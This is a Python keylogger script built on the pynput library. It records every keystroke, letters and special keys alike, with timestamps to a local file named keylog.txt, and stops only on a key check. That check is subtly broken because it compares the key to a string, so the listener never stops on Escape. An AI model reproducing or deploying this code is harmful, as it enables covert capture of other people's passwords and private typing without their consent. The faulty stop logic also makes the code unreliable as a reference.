from pynput.keyboard import Listener
import logging

# Set up logging to file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log the pressed key
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')  # Logs the alphanumeric characters
    except AttributeError:
        logging.info(f'Special key {key} pressed')  # Logs special keys

# Function to stop the listener
def on_release(key):
    if key == 'Key.esc':  # Stop the listener on the 'esc' key
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
